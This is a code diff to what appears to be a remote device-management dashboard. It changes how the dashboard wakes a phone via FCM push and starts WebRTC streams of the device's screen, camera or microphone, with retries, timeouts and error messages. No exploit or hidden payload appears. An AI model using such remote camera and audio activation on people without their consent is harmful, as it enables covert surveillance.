@@ -3549,35 +3549,40 @@ function startWebRTCStream(type) {
   title.textContent = titles[type];
   modal.classList.remove('hidden');
   
-  // Check if device is online
-  const isOnline = selectedDevice.isOnline || selectedDevice.online || 
-    (selectedDevice.lastSeen && (Date.now() - new Date(selectedDevice.lastSeen).getTime()) < 5 * 60 * 1000);
+  // Check if device is likely online (lastSeen within 10 minutes is considered potentially reachable)
+  const isLikelyOnline = selectedDevice.isOnline || selectedDevice.online || 
+    (selectedDevice.lastSeen && (Date.now() - new Date(selectedDevice.lastSeen).getTime()) < 10 * 60 * 1000);
   
-  if (!isOnline) {
-    streamVideo.innerHTML = `
-      <div class="device-wakeup-status">
-        <i class="fas fa-satellite-dish fa-spin" style="font-size: 48px; color: var(--primary);"></i>
-        <p class="connecting" style="margin-top: 16px;">📱 Waking up device...</p>
-        <p style="color: var(--text-muted); font-size: 0.85rem;">Device appears to be offline. Sending wake-up signal via FCM.</p>
-        <p style="color: var(--text-muted); font-size: 0.85rem;">This may take up to 30 seconds...</p>
-        <div class="wakeup-progress" style="margin-top: 12px;">
-          <div class="progress-bar" style="width: 100%; height: 4px; background: var(--surface-light); border-radius: 2px; overflow: hidden;">
-            <div class="progress-fill" id="wakeupProgress" style="width: 0%; height: 100%; background: var(--primary); transition: width 0.5s;"></div>
-          </div>
+  // Always try to connect directly first, even if device appears offline
+  // The FCM wakeup will be sent in parallel
+  streamVideo.innerHTML = `
+    <div class="device-wakeup-status">
+      <i class="fas fa-satellite-dish fa-spin" style="font-size: 48px; color: var(--primary);"></i>
+      <p class="connecting" style="margin-top: 16px;">📡 Connecting to device...</p>
+      <p style="color: var(--text-muted); font-size: 0.85rem;">${isLikelyOnline ? 'Establishing stream connection...' : 'Sending wake-up signal to device...'}</p>
+      <p style="color: var(--text-muted); font-size: 0.8rem; margin-top: 8px;">This may take up to 30 seconds...</p>
+      <div class="wakeup-progress" style="margin-top: 12px;">
+        <div class="progress-bar" style="width: 100%; height: 4px; background: var(--surface-light); border-radius: 2px; overflow: hidden;">
+          <div class="progress-fill" id="wakeupProgress" style="width: 0%; height: 100%; background: var(--primary); transition: width 0.5s;"></div>
         </div>
       </div>
-    `;
-    
-    // Start device wakeup sequence
-    startDeviceWakeupSequence(type);
-    return;
-  }
+    </div>
+  `;
   
-  // Device is online, proceed normally
-  initializeWebRTCConnection(type);
+  // Send FCM command immediately to wake up device
+  const commands = {
+    screen: 'start_webrtc_screen',
+    camera: 'start_webrtc_camera',
+    audio: 'start_webrtc_audio'
+  };
+  sendCommand(commands[type], {}, true);
+  
+  // Start connection with wakeup retry sequence
+  startWebRTCWithWakeup(type);
 }
 
-function startDeviceWakeupSequence(type) {
+// Unified WebRTC connection with wakeup retries
+function startWebRTCWithWakeup(type) {
   const streamVideo = document.getElementById('streamVideo');
   const commands = {
     screen: 'start_webrtc_screen',
@@ -3597,12 +3602,14 @@ function startDeviceWakeupSequence(type) {
     clearTimeout(webrtcConnectionTimeout);
   }
   
-  // Send initial FCM command
-  sendCommand(commands[type], {}, true);
+  // Update progress
   wakeupAttempts++;
   updateWakeupProgress(wakeupAttempts, maxAttempts);
   
-  // Set up periodic retry
+  // Initialize WebRTC connection immediately
+  initializeWebRTCConnection(type, false);
+  
+  // Set up periodic FCM retry to keep waking device
   deviceWakeupInterval = setInterval(async () => {
     wakeupAttempts++;
     
@@ -3610,23 +3617,26 @@ function startDeviceWakeupSequence(type) {
       clearInterval(deviceWakeupInterval);
       deviceWakeupInterval = null;
       
-      streamVideo.innerHTML = `
-        <div class="device-offline-status">
-          <i class="fas fa-exclamation-triangle" style="font-size: 48px; color: var(--warning);"></i>
-          <p style="margin-top: 16px; font-weight: 600; color: var(--text-primary);">Device Not Responding</p>
-          <p style="color: var(--text-muted); font-size: 0.9rem; max-width: 300px; margin: 8px auto;">
-            The device may be turned off, have no internet connection, or the app may have been force stopped.
-          </p>
-          <div style="margin-top: 16px; display: flex; gap: 12px; justify-content: center;">
-            <button class="btn-primary" onclick="startWebRTCStream('${type}')">
-              <i class="fas fa-redo"></i> Retry
-            </button>
-            <button class="btn-secondary" onclick="closeStreamModal()">
-              Cancel
-            </button>
+      // Only show error if no video is playing
+      if (!streamVideo.querySelector('video')) {
+        streamVideo.innerHTML = `
+          <div class="device-offline-status">
+            <i class="fas fa-exclamation-triangle" style="font-size: 48px; color: var(--warning);"></i>
+            <p style="margin-top: 16px; font-weight: 600; color: var(--text-primary);">Device Not Responding</p>
+            <p style="color: var(--text-muted); font-size: 0.9rem; max-width: 300px; margin: 8px auto;">
+              The device may be turned off, have no internet connection, or the app may have been force stopped.
+            </p>
+            <div style="margin-top: 16px; display: flex; gap: 12px; justify-content: center;">
+              <button class="btn-primary" onclick="startWebRTCStream('${type}')">
+                <i class="fas fa-redo"></i> Retry
+              </button>
+              <button class="btn-secondary" onclick="closeStreamModal()">
+                Cancel
+              </button>
+            </div>
           </div>
-        </div>
-      `;
+        `;
+      }
       return;
     }
     
@@ -3636,12 +3646,6 @@ function startDeviceWakeupSequence(type) {
     // Send another FCM wake-up command
     await sendCommand(commands[type], {}, true);
     debugLog(`[WebRTC] Wake-up attempt ${wakeupAttempts}/${maxAttempts}`);
-    
-    // Try to connect after a few attempts
-    if (wakeupAttempts === 3) {
-      // Try connecting to WebRTC signaling to see if device responded
-      initializeWebRTCConnection(type, true);
-    }
     
   }, attemptInterval);
   
@@ -3703,12 +3707,53 @@ function initializeWebRTCConnection(type, isRetry = false) {
       // Socket is open but no stream received
       if (!streamVideo.querySelector('video')) {
         streamVideo.innerHTML = `
-          <p class="connecting">⏳ Still waiting for device stream...</p>
-          <p style="color: var(--text-muted); font-size: 0.85rem;">Device may be starting up the camera service.</p>
+          <div style="text-align: center;">
+            <i class="fas fa-clock" style="font-size: 48px; color: var(--warning);"></i>
+            <p class="connecting">⏳ Still waiting for device stream...</p>
+            <p style="color: var(--text-muted); font-size: 0.85rem;">Device may be starting up the camera service.</p>
+            <p style="color: var(--text-muted); font-size: 0.85rem; margin-top: 8px;">Make sure the device has:</p>
+            <ul style="color: var(--text-muted); font-size: 0.8rem; text-align: left; max-width: 280px; margin: 8px auto;">
+              <li>Active internet connection</li>
+              <li>App running in background</li>
+              <li>Camera permission granted</li>
+            </ul>
+            <div style="margin-top: 16px; display: flex; gap: 12px; justify-content: center;">
+              <button class="btn-primary" onclick="startWebRTCStream('${type}')">
+                <i class="fas fa-redo"></i> Retry
+              </button>
+              <button class="btn-secondary" onclick="closeStreamModal()">
+                Cancel
+              </button>
+            </div>
+          </div>
         `;
       }
     }
   }, 15000);
+  
+  // Set overall stream timeout (45 seconds max wait)
+  const overallTimeout = setTimeout(() => {
+    if (!streamVideo.querySelector('video')) {
+      streamVideo.innerHTML = `
+        <div style="text-align: center;">
+          <i class="fas fa-exclamation-triangle" style="font-size: 48px; color: var(--warning);"></i>
+          <p style="margin-top: 16px; font-weight: 600; color: var(--text-primary);">Stream Not Available</p>
+          <p style="color: var(--text-muted); font-size: 0.9rem; max-width: 300px; margin: 8px auto;">
+            Unable to establish stream with device. The app may not be running or the device is offline.
+          </p>
+          <div style="margin-top: 16px; display: flex; gap: 12px; justify-content: center;">
+            <button class="btn-primary" onclick="startWebRTCStream('${type}')">
+              <i class="fas fa-redo"></i> Try Again
+            </button>
+            <button class="btn-secondary" onclick="closeStreamModal()">
+              Close
+            </button>
+          </div>
+        </div>
+      `;
+      closeWebRTCConnection();
+    }
+  }, 45000);
   
   webrtcSignalingSocket.onopen = () => {
     debugLog('[WebRTC] Signaling connected');
@@ -3733,6 +3778,7 @@ function initializeWebRTCConnection(type, isRetry = false) {
   webrtcSignalingSocket.onmessage = (event) => {
     try {
       clearTimeout(connectionTimeout);
+      clearTimeout(overallTimeout);
       const message = JSON.parse(event.data);
       handleWebRTCSignalingMessage(message, type);
     } catch (e) {
@@ -3743,12 +3789,27 @@ function initializeWebRTCConnection(type, isRetry = false) {
   webrtcSignalingSocket.onerror = (error) => {
     console.error('[WebRTC] Signaling error:', error);
     clearTimeout(connectionTimeout);
-    streamVideo.innerHTML = '<p class="error">Connection error. Please try again.</p>';
+    clearTimeout(overallTimeout);
+    streamVideo.innerHTML = `
+      <div style="text-align: center;">
+        <i class="fas fa-exclamation-circle" style="font-size: 48px; color: var(--error);"></i>
+        <p style="margin-top: 12px; color: var(--error);">Connection error</p>
+        <div style="margin-top: 16px; display: flex; gap: 12px; justify-content: center;">
+          <button class="btn-primary" onclick="startWebRTCStream('${type}')">
+            <i class="fas fa-redo"></i> Retry
+          </button>
+          <button class="btn-secondary" onclick="closeStreamModal()">
+            Cancel
+          </button>
+        </div>
+      </div>
+    `;
   };
   
   webrtcSignalingSocket.onclose = () => {
     debugLog('[WebRTC] Signaling closed');
     clearTimeout(connectionTimeout);
+    clearTimeout(overallTimeout);
   };
 }
 
@@ -3808,6 +3869,7 @@ function handleWebRTCSignalingMessage(message, type) {
             <i class="fas fa-satellite-dish fa-pulse" style="font-size: 48px; color: var(--primary);"></i>
             <p class="connecting" style="margin-top: 12px;">📡 Waiting for device stream...</p>
             <p style="color: var(--text-muted); font-size: 0.85rem;">Device is starting the camera service.</p>
+            <p style="color: var(--text-muted); font-size: 0.8rem; margin-top: 12px;">This may take 10-20 seconds...</p>
           </div>
         `;
       }
